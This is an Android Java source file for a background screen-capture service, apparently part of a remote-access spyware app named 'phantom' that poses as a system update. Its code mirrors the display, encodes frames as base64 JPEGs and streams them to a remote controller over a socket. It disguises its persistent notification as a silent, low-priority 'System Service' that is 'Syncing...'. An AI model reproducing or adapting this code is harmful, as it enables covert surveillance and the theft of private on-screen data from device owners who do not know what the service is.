package com.systemupdate.app;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCaptureService extends Service {

    private static final String TAG = "ScreenCapture";
    private static final String CHANNEL_ID = "phantom_screen_capture";
    private static final int NOTIFICATION_ID = 4401;

    private MediaProjection projection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private HandlerThread imageThread;
    private Handler imageHandler;

    private int width;
    private int height;
    private int density;

    private volatile boolean streaming = false;
    private long lastFrameTime = 0L;
    private static final int FRAME_INTERVAL_MS = 200;

    private Bitmap reusableBitmap;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;

        startForegroundWithType();

        int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
        Intent data = intent.getParcelableExtra("data");

        if (resultCode != Activity.RESULT_OK || data == null) {
            PhantomLog.w(TAG, "MediaProjection permission denied");
            stopSelf();
            return START_NOT_STICKY;
        }

        startCapture(resultCode, data);
        return START_STICKY;
    }

    private void startForegroundWithType() {
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void startCapture(int resultCode, Intent data) {
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            if (wm != null) {
                wm.getDefaultDisplay().getRealMetrics(metrics);
            }
            width = metrics.widthPixels;
            height = metrics.heightPixels;
            density = metrics.densityDpi;

            PhantomLog.i(TAG, "Screen: " + width + "x" + height + " @" + density);

            MediaProjectionManager mpm = (MediaProjectionManager)
                getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            projection = mpm.getMediaProjection(resultCode, data);

            if (projection == null) {
                PhantomLog.e(TAG, "projection null");
                stopSelf();
                return;
            }

            projection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    PhantomLog.w(TAG, "MediaProjection stopped by user or system");
                    stopStreaming();
                    stopSelf();
                }
            }, new Handler(Looper.getMainLooper()));

            imageThread = new HandlerThread("PhantomScreenCapture");
            imageThread.start();
            imageHandler = new Handler(imageThread.getLooper());

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            imageReader.setOnImageAvailableListener(onImageAvailable, imageHandler);

            virtualDisplay = projection.createVirtualDisplay(
                "phantom-screen",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                imageHandler
            );

            streaming = true;
            PhantomLog.i(TAG, "MediaProjection capture started");
            result("START_STREAM", "ok");

        } catch (Throwable t) {
            PhantomLog.e(TAG, "startCapture failed", t);
            result("START_STREAM", "failed: " + t.getMessage());
            stopSelf();
        }
    }

    private final ImageReader.OnImageAvailableListener onImageAvailable =
        new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader reader) {
                if (!streaming) {
                    Image img = reader.acquireLatestImage();
                    if (img != null) img.close();
                    return;
                }

                long now = System.currentTimeMillis();
                if (now - lastFrameTime < FRAME_INTERVAL_MS) {
                    Image img = reader.acquireLatestImage();
                    if (img != null) img.close();
                    return;
                }
                lastFrameTime = now;

                Image image = null;
                Bitmap bmp = null;
                Bitmap cropped = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image == null) return;

                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * width;

                    int bitmapWidth = width + rowPadding / pixelStride;

                    if (reusableBitmap == null || reusableBitmap.getWidth() != bitmapWidth
                            || reusableBitmap.getHeight() != height) {
                        if (reusableBitmap != null) reusableBitmap.recycle();
                        reusableBitmap = Bitmap.createBitmap(bitmapWidth, height,
                            Bitmap.Config.ARGB_8888);
                    }
                    reusableBitmap.copyPixelsFromBuffer(buffer);

                    cropped = Bitmap.createBitmap(reusableBitmap, 0, 0, width, height);

                    int targetW = width / 2;
                    int targetH = height / 2;
                    if (targetW < 1) targetW = 1;
                    if (targetH < 1) targetH = 1;
                    Bitmap scaled = Bitmap.createScaledBitmap(cropped, targetW, targetH, false);
                    if (scaled != cropped) cropped.recycle();

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    scaled.compress(Bitmap.CompressFormat.JPEG, 55, baos);
                    scaled.recycle();

                    String b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);

                    SocketManager sm = SocketManager.getInstance();
                    if (sm != null) sm.sendScreenFrame(b64);

                } catch (Throwable t) {
                    PhantomLog.e(TAG, "frame encode failed", t);
                } finally {
                    if (cropped != null && cropped != reusableBitmap) {
                        try { cropped.recycle(); } catch (Throwable ignored) { }
                    }
                    if (bmp != null && bmp != reusableBitmap) {
                        try { bmp.recycle(); } catch (Throwable ignored) { }
                    }
                    if (image != null) image.close();
                }
            }
        };

    private void stopStreaming() {
        streaming = false;
        try { if (virtualDisplay != null) virtualDisplay.release(); } catch (Throwable t) { }
        virtualDisplay = null;
        try { if (imageReader != null) imageReader.close(); } catch (Throwable t) { }
        imageReader = null;
        try { if (projection != null) projection.stop(); } catch (Throwable t) { }
        projection = null;
        if (reusableBitmap != null) {
            try { reusableBitmap.recycle(); } catch (Throwable t) { }
            reusableBitmap = null;
        }
        if (imageThread != null) {
            try { imageThread.quitSafely(); } catch (Throwable t) { }
            imageThread = null;
            imageHandler = null;
        }
    }

    private void result(String cmd, String status) {
        try {
            SocketManager sm = SocketManager.getInstance();
            if (sm != null) sm.sendCommandResult(cmd, status);
        } catch (Throwable t) { }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, CHANNEL_ID);
        } else {
            b = new Notification.Builder(this);
        }
        return b.setContentTitle("System Service")
            .setContentText("Syncing...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build();
    }

    @Override
    public void onDestroy() {
        stopStreaming();
        PhantomLog.w(TAG, "ScreenCaptureService destroyed");
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}